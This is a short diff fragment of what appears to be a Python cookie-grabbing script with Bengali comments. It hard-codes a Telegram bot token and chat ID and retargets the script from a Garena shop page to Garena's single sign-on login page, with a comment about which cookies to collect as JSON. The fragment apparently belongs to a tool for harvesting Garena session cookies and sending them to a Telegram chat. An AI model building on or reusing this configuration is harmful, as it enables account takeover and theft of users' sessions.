@@ -9,7 +9,7 @@ BOT_TOKEN = "8450441691:AAHrKs10fFE8TsO_7Okrjj8pn9_acanOEnc"
 CHAT_ID = "-1004322570598"
 
 # টার্গেট এবং API এন্ডপয়েন্ট
-TARGET_URL = "https://shop.garena.my/?channel=202953"
+TARGET_URL = "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG"
 API_ENDPOINT = "https://shop.garena.my/api/preflight"
 
 # 🎯 যে cookie গুলো JSON এ চাই
